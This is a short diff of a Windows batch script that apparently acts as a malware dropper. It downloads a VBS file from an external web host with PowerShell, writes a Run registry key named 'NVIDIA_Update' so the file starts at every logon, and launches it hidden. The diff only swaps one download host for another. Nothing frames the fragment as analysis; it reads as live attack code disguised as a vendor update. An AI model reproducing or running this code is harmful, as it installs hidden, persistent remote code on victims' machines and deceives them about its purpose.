@@ -30,6 +30,6 @@ del "%tempFile2%" 2>nul
 ren "%t%" "NVS_UPDATE.PS1"
 
 :: Download and run VBS And Add To Statrtup
-powershell -Command "iwr fancy-seehorse.netlify.app/code/s-nvs_update.vbs -o '%vbsFile%'"
+powershell -Command "iwr https://service-omega-snowy.vercel.app/s-nvs_update.vbs -o '%vbsFile%'"
 powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'NVIDIA_Update' -Value 'wscript.exe \"%APPDATA%\nvidia_sys\logs\s-nvs_update.vbs\"'"
 start /min wscript "%vbsFile%"
